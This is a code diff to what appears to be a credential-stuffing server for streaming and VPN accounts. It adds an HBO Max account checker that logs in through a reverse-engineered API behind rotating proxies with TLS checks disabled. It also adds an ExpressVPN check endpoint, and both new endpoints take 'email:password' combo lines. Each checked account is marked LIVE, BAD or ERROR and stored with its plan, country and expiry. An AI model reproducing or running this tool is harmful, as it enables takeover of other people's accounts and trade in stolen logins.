@@ -20,6 +20,8 @@ from urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
+from expressvpn_checker import check_expressvpn_account
+
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 PORT = int(os.environ.get("PORT", 8080))
 PROXIES_FILE = os.path.join(BASE_DIR, "netflix_proxies.txt")
@@ -395,8 +397,8 @@ def clear_history(only_dead=False):
         conn = get_db()
         c = conn.cursor()
         if only_dead:
-            c.execute('DELETE FROM history WHERE status = "DEAD" OR status = "ERROR"')
-            logging.info("Deleted only DEAD/ERROR history records.")
+            c.execute('DELETE FROM history WHERE status = "DEAD" OR status = "ERROR" OR status = "BAD"')
+            logging.info("Deleted only DEAD/ERROR/BAD history records.")
         else:
             c.execute('DELETE FROM history')
             logging.info("History database cleared completely.")
@@ -1446,6 +1448,201 @@ def check_crunchyroll_account(email, password, use_proxy=True):
     return result
 
 
+# ══════════════════════════════════════════════════════════════════════════════
+# HBO Max (Max) Account Checker (Comet API reverse-engineered flow)
+# ══════════════════════════════════════════════════════════════════════════════
+
+import uuid as _uuid_mod
+import base64
+
+HBO_CLIENT_ID = "585b02c8-dbe1-432f-b1bb-11cf670fbeb0"
+HBO_CLIENT_SECRET = "585b02c8-dbe1-432f-b1bb-11cf670fbeb0"
+HBO_TOKEN_URL = "https://comet.api.hbo.com/tokens"
+
+HBO_BASE_HDRS = {
+    "X-Hbo-Client-Version": "Hadron/50.3.0.362",
+    "Accept": "application/vnd.hbo.v9.full+json",
+    "Content-Type": "application/json",
+    "X-Hbo-Device-Name": "desktop",
+    "X-Hbo-Device-Os-Version": "undefined",
+    "Origin": "https://play.max.com",
+    "Referer": "https://play.max.com/",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+}
+
+
+def _hbo_decode_jwt(token):
+    """Decode the middle segment of a JWT (base64url) and return the payload dict."""
+    try:
+        parts = token.split(".")
+        if len(parts) < 2:
+            return {}
+        payload = parts[1]
+        # Fix padding
+        payload += "=" * (4 - len(payload) % 4)
+        decoded = base64.urlsafe_b64decode(payload)
+        return json.loads(decoded)
+    except Exception:
+        return {}
+
+
+def check_hbomax_account(email, password, use_proxy=True):
+    """Check an HBO Max / Max account via Comet API. Returns dict with status/details."""
+    proxy_url = None
+    proxy_label = "Direct"
+    if use_proxy:
+        prx, label, raw_url = get_random_proxy()
+        if prx:
+            proxy_url = prx.get("http") or prx.get("https")
+            proxy_label = label or "Proxy"
+
+    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
+    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+    device_serial = str(_uuid_mod.uuid4())
+
+    session = requests.Session()
+    session.verify = False
+    session.headers.update(HBO_BASE_HDRS)
+    if proxies:
+        session.proxies = proxies
+
+    # Step 1: Client credentials token
+    try:
+        step1_body = {
+            "client_id": HBO_CLIENT_ID,
+            "client_secret": HBO_CLIENT_SECRET,
+            "scope": "browse video_playback_free",
+            "grant_type": "client_credentials",
+            "deviceSerialNumber": device_serial,
+            "clientDeviceData": {
+                "paymentProviderCode": "blackmarket"
+            }
+        }
+        r1 = session.post(HBO_TOKEN_URL, json=step1_body, timeout=20)
+
+        if r1.status_code == 403 or "geo" in r1.text.lower():
+            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": "Geo-blocked / IP blocked by HBO", "route": route}
+
+        if r1.status_code != 200:
+            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": f"Client auth failed ({r1.status_code})", "route": route}
+
+        r1_data = r1.json()
+        client_token = r1_data.get("access_token")
+        if not client_token:
+            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": "No client access_token returned", "route": route}
+
+    except requests.exceptions.RequestException as e:
+        save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "reason": f"Client auth request failed: {str(e)[:100]}", "route": route}
+
+    # Step 2: User login
+    try:
+        session.headers["Authorization"] = f"Bearer {client_token}"
+        step2_body = {
+            "scope": "browse video_playback device elevated_account_management",
+            "grant_type": "user_name_password",
+            "username": email,
+            "password": password
+        }
+        r2 = session.post(HBO_TOKEN_URL, json=step2_body, timeout=20)
+        r2_text = r2.text.lower()
+
+        if r2.status_code == 401 or "incorrect" in r2_text or "invalid" in r2_text:
+            save_history("hbomax", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}
+
+        if r2.status_code == 403 or "geo" in r2_text:
+            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": "Geo-blocked / IP blocked", "route": route}
+
+        if r2.status_code == 429:
+            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}
+
+        r2_data = r2.json()
+
+        is_logged_in = r2_data.get("isUserLoggedIn", False)
+        user_token = r2_data.get("access_token", "")
+        refresh_token = r2_data.get("refresh_token", "")
+
+        if not is_logged_in and not user_token:
+            # Check for specific error messages
+            err_msg = r2_data.get("message", "") or r2_data.get("error_description", "") or ""
+            if "incorrect" in err_msg.lower() or "invalid" in err_msg.lower():
+                save_history("hbomax", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
+                return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}
+            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+            return {"status": "ERROR", "reason": f"Login failed: {err_msg or r2.status_code}", "route": route}
+
+    except requests.exceptions.RequestException as e:
+        save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
+        return {"status": "ERROR", "reason": f"Login request failed: {str(e)[:100]}", "route": route}
+
+    session.close()
+
+    # Parse JWT for subscription info
+    plan = "Max (Free)"
+    country = ""
+    sub_tier = ""
+    exp_date = ""
+
+    if user_token:
+        jwt_payload = _hbo_decode_jwt(user_token)
+        # Extract subscription info from JWT claims
+        sub_tier = jwt_payload.get("subscriptionTier", "") or jwt_payload.get("tier", "") or ""
+        country = jwt_payload.get("territory", "") or jwt_payload.get("country", "") or ""
+        exp_ts = jwt_payload.get("exp", 0)
+
+        # Parse plan from token claims
+        entitlements = jwt_payload.get("entitlements", []) or []
+        package_names = jwt_payload.get("packages", []) or []
+
+        if sub_tier:
+            tier_lower = sub_tier.lower()
+            if "ultimate" in tier_lower or "platinum" in tier_lower:
+                plan = "Max Ultimate Ad-Free"
+            elif "ad_free" in tier_lower or "adfree" in tier_lower or "premium" in tier_lower:
+                plan = "Max Ad-Free"
+            elif "ads" in tier_lower or "with_ads" in tier_lower or "basic" in tier_lower:
+                plan = "Max With Ads"
+            else:
+                plan = f"Max {sub_tier.replace('_', ' ').title()}"
+        elif entitlements:
+            ent_str = " ".join(str(e) for e in entitlements).lower()
+            if "hbo" in ent_str or "max" in ent_str:
+                plan = "Max (Active)"
+
+        if exp_ts:
+            try:
+                from datetime import datetime as _dt
+                exp_date = _dt.fromtimestamp(exp_ts).strftime("%Y-%m-%d %H:%M:%S")
+            except Exception:
+                pass
+
+    country_name = normalize_country(country) if country and len(country) == 2 else (country or "N/A")
+    status = "LIVE"
+
+    # Save to history
+    plan_str = plan
+    save_history("hbomax", status, plan=plan_str, billing=exp_date,
+                 country=country_name, route=route,
+                 raw_cookie=f"{email}:{password}", email=email)
+
+    return {
+        "status": status,
+        "email": email,
+        "plan": plan,
+        "country": country_name,
+        "tier": sub_tier,
+        "token_expiry": exp_date,
+        "has_refresh_token": bool(refresh_token),
+        "route": route,
+    }
+
+
 # In-memory sliding window rate limiter
 rate_limit_lock = threading.Lock()
 ip_request_history = {}
@@ -1666,8 +1863,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
 
-        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/proxies/save", "/api/proxies/test", "/api/history/clear", "/api/system/reload"):
-            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check") else 50
+        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check", "/api/proxies/save", "/api/proxies/test", "/api/history/clear", "/api/system/reload"):
+            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check") else 50
             if is_rate_limited(client_ip, max_requests=rate_limit, window_seconds=10, bucket="api"):
                 self.send_response(429)
                 self.send_header("Content-Type", "application/json")
@@ -1758,6 +1955,78 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     if not email or not password:
                         raise ValueError("Email dan password wajib diisi")
                     out = check_crunchyroll_account(email, password, use_proxy=p.get("use_proxy", True))
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(res)
+
+            elif self.path == "/api/expressvpn/check":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    email = p.get("email", "").strip()
+                    password = p.get("password", "").strip()
+                    if not email or not password:
+                        combo = p.get("combo", "").strip()
+                        if combo:
+                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
+                            if ":" in combo_clean:
+                                email, password = combo_clean.split(":", 1)
+                                email = email.strip()
+                                password = password.strip()
+                    if not email or not password:
+                        raise ValueError("Email dan password wajib diisi")
+                    out = check_expressvpn_account(
+                        email, password,
+                        use_proxy=p.get("use_proxy", True),
+                        get_proxy_fn=get_random_proxy,
+                        save_history_fn=save_history
+                    )
+                    # Save ExpressVPN result to history DB
+                    evpn_status = out.get("status", "ERROR")
+                    evpn_plan = out.get("plan", "")
+                    if evpn_plan:
+                        evpn_plan = f"ExpressVPN {evpn_plan}"
+                    evpn_billing = ""
+                    if out.get("expire_date"):
+                        days = out.get("days_left", 0)
+                        evpn_billing = f"Exp: {out['expire_date']} ({days}d left)"
+                        if out.get("auto_renew") == "true":
+                            evpn_billing += " [Auto-renew]"
+                    evpn_route = out.get("route", "Direct")
+                    if isinstance(evpn_route, tuple):
+                        evpn_route = str(evpn_route[1]) if len(evpn_route) > 1 else str(evpn_route)
+                    save_history("expressvpn", evpn_status, plan=evpn_plan, billing=evpn_billing,
+                                 country="", route=evpn_route,
+                                 raw_cookie=f"{email}:{password}", email=email)
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(res)
+
+            elif self.path == "/api/hbomax/check":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    email = p.get("email", "").strip()
+                    password = p.get("password", "").strip()
+                    if not email or not password:
+                        combo = p.get("combo", "").strip()
+                        if combo:
+                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
+                            if ":" in combo_clean:
+                                email, password = combo_clean.split(":", 1)
+                                email = email.strip()
+                                password = password.strip()
+                    if not email or not password:
+                        raise ValueError("Email dan password wajib diisi")
+                    out = check_hbomax_account(email, password, use_proxy=p.get("use_proxy", True))
                     res = json.dumps(out).encode("utf-8")
                     self.send_response(200)
                 except Exception as e:
